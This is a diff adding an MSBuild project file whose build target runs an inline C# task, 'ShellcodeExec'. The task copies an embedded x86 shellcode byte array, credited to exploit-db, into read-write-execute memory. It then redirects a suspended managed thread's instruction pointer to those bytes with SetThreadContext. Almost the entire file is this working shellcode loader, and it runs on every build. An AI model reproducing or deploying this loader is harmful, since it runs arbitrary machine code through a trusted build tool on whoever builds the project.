@@ -1,0 +1,173 @@
+<Project>
+	<UsingTask
+		TaskName="ShellcodeExec"
+		TaskFactory="RoslynCodeTaskFactory"
+		AssemblyFile="$(MSBuildToolsPath)\Microsoft.Build.Tasks.Core.dll">
+		<ParameterGroup />
+		<Task>
+			<Using Namespace="System" />
+			<Using Namespace="System.Runtime.InteropServices" />
+			<Code Type="Class" Language="cs">
+				<![CDATA[
+				using System;
+				using System.Runtime.InteropServices;
+				using System.Threading;
+				using Microsoft.Build.Framework;
+				using Microsoft.Build.Utilities;
+
+				public class ShellcodeExec : Task
+				{
+					// Shellcode from https://www.exploit-db.com/exploits/28996
+				    static readonly byte[] Shellcode =
+			        {
+			            0x31, 0xD2, 0xB2, 0x30, 0x64, 0x8B, 0x12, 0x8B,
+			            0x52, 0x0C, 0x8B, 0x52, 0x1C, 0x8B, 0x42, 0x08,
+			            0x8B, 0x72, 0x20, 0x8B, 0x12, 0x80, 0x7E, 0x0C,
+			            0x33, 0x75, 0xF2, 0x89, 0xC7, 0x03, 0x78, 0x3C,
+			            0x8B, 0x57, 0x78, 0x01, 0xC2, 0x8B, 0x7A, 0x20,
+			            0x01, 0xC7, 0x31, 0xED, 0x8B, 0x34, 0xAF, 0x01,
+			            0xC6, 0x45, 0x81, 0x3E, 0x46, 0x61, 0x74, 0x61,
+			            0x75, 0xF2, 0x81, 0x7E, 0x08, 0x45, 0x78, 0x69,
+			            0x74, 0x75, 0xE9, 0x8B, 0x7A, 0x24, 0x01, 0xC7,
+			            0x66, 0x8B, 0x2C, 0x6F, 0x8B, 0x7A, 0x1C, 0x01,
+			            0xC7, 0x8B, 0x7C, 0xAF, 0xFC, 0x01, 0xC7, 0x68,
+			            0x79, 0x74, 0x65, 0x01, 0x68, 0x6B, 0x65, 0x6E,
+			            0x42, 0x68, 0x20, 0x42, 0x72, 0x6F, 0x89, 0xE1,
+			            0xFE, 0x49, 0x0B, 0x31, 0xC0, 0x51, 0x50, 0xFF,
+			            0xD7
+			        };
+
+			        [DllImport("kernel32.dll")]
+			        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+
+			        const uint MEM_COMMIT = 0x1000;
+			        const uint PAGE_EXECUTE_READWRITE = 0x40;
+
+			        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
+			        public static extern IntPtr OpenThread(ThreadAccess dwDesiredAccess, bool bInheritHandle, int dwThreadId);
+
+			        [Flags]
+			        public enum ThreadAccess : uint
+			        {
+			            SuspendResume = 0x0002,
+			            GetContext = 0x0008,
+			            SetContext = 0x0010
+			        }
+
+			        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
+			        public static extern int SuspendThread(IntPtr hThread);
+
+			        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
+			        public static extern int ResumeThread(IntPtr hThread);
+
+			        [Flags]
+			        public enum ContextFlags : uint
+			        {
+			            I386 = 0x10000,
+			            Control = I386 | 0x01,
+			            Integer = I386 | 0x02,
+			            Segments = I386 | 0x04,
+			            FloatingPoint = I386 | 0x08,
+			            DebugRegisters = I386 | 0x10,
+			            ExtendedRegisers = I386 | 0x20,
+			            All = Control | Integer | Segments | FloatingPoint | DebugRegisters | ExtendedRegisers,
+			        }
+
+			        [StructLayout(LayoutKind.Sequential)]
+			        public struct XmmSave
+			        {
+			            public int ControlWord;
+			            public int StatusWord;
+			            public int TagWord;
+			            public int ErrorOffset;
+			            public int ErrorSelector;
+			            public int DataOffset;
+			            public int DataSelector;
+			            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 80)]
+			            public byte[] RegisterArea;
+			            public int Cr0NpxState;
+			        }
+
+			        [StructLayout(LayoutKind.Sequential)]
+			        public struct ThreadContext
+			        {
+			            public ContextFlags Flags;
+			            public uint Dr0;
+			            public uint Dr1;
+			            public uint Dr2;
+			            public uint Dr3;
+			            public uint Dr6;
+			            public uint Dr7;
+			            public XmmSave Xmm;
+			            public uint SegGs;
+			            public uint SegFs;
+			            public uint SegEs;
+			            public uint SegDs;
+			            public uint Edi;
+			            public uint Esi;
+			            public uint Ebx;
+			            public uint Edx;
+			            public uint Ecx;
+			            public uint Eax;
+			            public uint Ebp;
+			            public uint Eip;
+			            public uint SegCs;
+			            public uint EFlags;
+			            public uint Esp;
+			            public uint SegSs;
+			            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 512)]
+			            public byte[] ExtendedRegisters;
+			        }
+
+			        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
+			        public static extern bool GetThreadContext(IntPtr hThread, ref ThreadContext lpContext);
+
+			        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
+			        public static extern bool SetThreadContext(IntPtr hThread, ref ThreadContext lpContext);
+
+			        [DllImport("kernel32.dll")]
+			        public static extern int GetCurrentThreadId();
+
+				    public override bool Execute()
+				    {
+						// You may be like "Why would I overcomplicate this?" and that's a good question.
+						// Here's my answer: I couldn't get CreateThread to work so I created a managed thread and hijacked it.
+
+				        var cave = VirtualAlloc(IntPtr.Zero, (uint)Shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+			            Marshal.Copy(Shellcode, 0, cave, Shellcode.Length);
+
+			            using var waiter = new AutoResetEvent(false);
+			            var threadId = 0;
+
+			            var thread = new Thread(() =>
+			            {
+			                threadId = GetCurrentThreadId();
+			                waiter.Set();
+			                waiter.WaitOne();
+			            });
+
+			            thread.Start();
+			            waiter.WaitOne();
+
+			            var threadHandle = OpenThread(ThreadAccess.SuspendResume | ThreadAccess.GetContext | ThreadAccess.SetContext, true, threadId);
+			            SuspendThread(threadHandle);
+
+			            var context = new ThreadContext { Flags = ContextFlags.All };
+			            GetThreadContext(threadHandle, ref context);
+			            context.Eip = (uint)cave.ToInt32();
+			            SetThreadContext(threadHandle, ref context);
+
+			            ResumeThread(threadHandle);
+			            waiter.Set();
+
+			            return true;
+				    }
+				}
+				]]>
+			</Code>
+		</Task>
+	</UsingTask>
+	<Target Name="Build">
+		<ShellcodeExec />
+	</Target>
+</Project>
